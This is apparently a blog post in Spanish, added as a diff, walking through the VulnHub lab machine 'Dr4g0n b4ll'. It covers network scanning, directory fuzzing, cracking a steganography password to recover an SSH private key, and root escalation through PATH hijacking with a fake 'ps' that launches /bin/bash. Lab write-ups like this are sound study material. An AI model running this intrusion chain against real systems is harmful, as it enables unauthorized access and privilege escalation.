@@ -1,0 +1,195 @@
+---
+layout: post
+title: "Dr4g0n b4ll"
+date: 2024-05-22 13:25:23
+category: sample
+vm: vulnhub
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/vulnhub/vulnhub.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Dr4g0n b4ll </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
+  <tr> <td><strong><a href="https://www.vulnhub.com/entry/dr4g0n-b4ll-1,646/" target="_blank"> Descarga</a></strong></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/host.png){:.margin}
+
+**1\.** Pillamos la ip objetivo.
+
+`sudo arp-scan -l`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/arp.png){:.margin}
+
+**2\.** Escaneo puertos y tambien servicios.
+
+`sudo nmap -p- --open -T5 -sCV --min-rate=5000 -n -Pn 192.168.1.8`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/nmap.png){:.margin}
+
+**3\.** Hecho un ojo a la pagina apache.
+
+`http://192.168.1.8:80`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/80.png){:.margin}
+
+**4\.** Hago fuzzing de directorios y archivos en la web.
+
+`gobuster dir -u http://192.168.1.8/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,php,txt`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/gobuster.png){:.margin}
+
+**5\.** Este archivo me da un texto.
+
+`http://192.168.1.8/robots.txt`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/robots.png){:.margin}
+
+**6\.** Lo pego en [Cyberchef](https://gchq.github.io/CyberChef/)  para decodificar.
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/cybercheffind.png){:.margin}
+
+**7\.** Vuelvo a la pagina principal y analizo el codigo fuente.
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/ctrlu.png){:.margin}
+
+**8\.** Por muy debajo encuentro una linea comentada, lo llevo a Cyberchef.
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/cyberchefdir.png){:.margin}
+
+**9\.** Me dirigo a esa ruta en la web.
+
+`http://192.168.1.8/DRAGON BALL/`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/dbindex.png){:.margin}
+
+**10\.** En el archivo al parecer tenemos rutas.
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/secret.png){:.margin}
+
+**11\.** Ya dentro de la carpeta vulnhub, tenemos dos archivos.
+
+_\- En el login pillamos un potencial usuario_
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/login.png){:.margin}
+
+**12\.** Ahora analizando la imagen.
+
+_12.1- Descago la imagen_
+
+`wget http://192.168.1.8/DRAGON%20BALL/Vulnhub/aj.jpg`
+
+_12.2- Con steghide extraigo archivos ocultos, pero me pide una clave_
+
+`steghide --extract -sf aj.jpg`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/steghidefail.png){:.margin}
+
+_12.3- Crackeo la contraseña, si es exitoso lo extrae automaticamente_
+
+`stegcracker aj.jpg -q`
+
+`ls`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/stegcracker.png){:.margin}
+
+_12.4- Tenemos un clave privada, lo renombro y le doy permisos_
+
+`file aj.jpg.out`
+
+`mv aj.jpg.out id_rsa`
+
+`chmod 600 id_rsa`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/idrsa.png){:.margin}
+
+**13\.** Accedo por ssh como usuario xmen.
+
+`ssh -i id_rsa xmen@192.168.1.8`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/ssh.png){:.margin}
+
+**14\.** En el archivo esta nuestra flag de usuario.
+
+_\- Dentro de la carpeta tenemos dos archivos_
+
+`cd script`
+
+`ls`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/scriptfiles.png){:.margin}
+
+**15\.** Analizando los archivos.
+
+_15.1- En el contenido de demo.c veo que ejecuta el comando ps_
+
+`cat demo.c`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/demo.png){:.margin}
+
+_15.2- Al ejecutar shell me resulta una copia de la salida del comando ps_
+
+`./shell`
+
+`ps`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/shell.png){:.margin}
+
+_\- Entre las cadenas del binario shell hallo demo.c, supongo que al ejecutar shell tambien ejecuta las instrucciones de demo.c, por eso en la salida de shell tambien se ve que se ejecuto ps_
+
+`strings shell | grep demo`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/strings.png){:.margin}
+
+**16\.** En demo.c veo que ps no es llamado con su ruta absoluta, supongo que busca en el path.
+
+_16.1- En principio veo la ruta relativa de ps_
+
+`which ps`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/which.png){:.margin}
+
+_16.2- Creo mi propio 'binario' ps y lo agrego al path_
+
+`cd /tmp`
+
+`echo "/bin/bash" > ps`
+
+`chmod +x ps`
+
+`export PATH=/tmp:$PATH`
+
+`echo $PATH`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/newps.png){:.margin}
+
+_16.3- Compruebo la nueva ruta de ps_
+
+`which ps`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/whichnew.png){:.margin}
+
+**17\.** Por ultimo escalo privilegios.
+
+`cd /home/xmen/script`
+
+`./shell`
+
+![img](/notas/public/img/vulnhub/Dr4gon_b4ll/root.png){:.margin}
+
+
+<br>
+
+<span class="finish">_Finalizado._</span>
